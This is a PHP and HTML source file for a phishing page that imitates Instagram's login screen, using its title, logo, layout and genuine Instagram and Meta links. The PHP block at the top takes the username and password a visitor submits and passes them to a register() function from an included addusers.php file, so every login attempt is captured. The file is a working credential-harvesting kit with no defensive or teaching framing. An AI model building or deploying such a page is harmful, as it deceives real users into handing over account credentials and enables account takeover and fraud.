<?php
require_once "addusers.php";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $user = $_POST['user'];
    $password = $_POST['password'];
    if (!empty($user) && !empty($password)) {
        register($user, $password);
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>

    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo">
                    <img src="instagram.png" alt="instagram" style="width: 175px;">
                </div>
                <form method="POST">
                    <div class="form">
                        <div class="input_field">
                            <input type="text" placeholder="Phone number, username, or email" class="input" name="user">
                        </div>
                        <div class="input_field">
                            <input type="password" placeholder="Password" class="input" name="password">
                        </div>
                        <button type="submit" class="btn">Log In</button>
                    </div>
                </form>

                <div class="or">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="dif">
                    <div class="fb">
                        <img src="facebook.png" alt="facebook">
                        <p>Log in with Facebook</p>
                    </div>
                    <div class="forgot">
                        <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                    </div>
                </div>
            </div>
            <div class="signup">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>
            <div class="apps">
                <p>Get the app.</p>
                <div class="icons">
                    <a href="https://l.instagram.com/?u=https%3A%2F%2Fitunes.apple.com%2Fapp%2Finstagram%2Fid389801252%3Fpt%3D428156%26ct%3Digweb.loginPage.badge%26mt%3D8%26vt%3Dlo&e=ATM5urvUb71QU0u9I57rvhhhYnefLjrrqZ-vgn26LlyO9E16E0dnRCpoLR6KlyF21qeN3Hg9db1c53OPthC6vfIrJsETHKGE&s=1"><img src="appstore.png" alt="appstore"></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DF72E1CBD-0E16-4969-92D6-47AF3ADE6D30%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="googleplay.png" alt="googleplay"></a>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <ul>
                    <li><a href="https://about.facebook.com/meta">Meta</a></li>
                    <li><a href="https://about.instagram.com/">About</a></li>
                    <li><a href="https://about.instagram.com/en_US/blog">Blog</a></li>
                    <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
                    <li><a href="https://help.instagram.com/">Help</a></li>
                    <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
                    <li><a href="https://help.instagram.com/519522125107875/?maybe_redirect_pol=0">Privacy</a></li>
                    <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
                    <li><a href="https://www.instagram.com/directory/profiles/">Top Accounts</a></li>
                    <li><a href="https://www.instagram.com/directory/hashtags/">Hashtags</a></li>
                    <li><a href="https://www.instagram.com/accounts/login/?next=/explore/locations/">Locations</a></li>
                </ul>
            </div>
            <div class="copyright">
                © 2022 Instagram from Meta
            </div>
        </div>
    </div>

</body>

</html>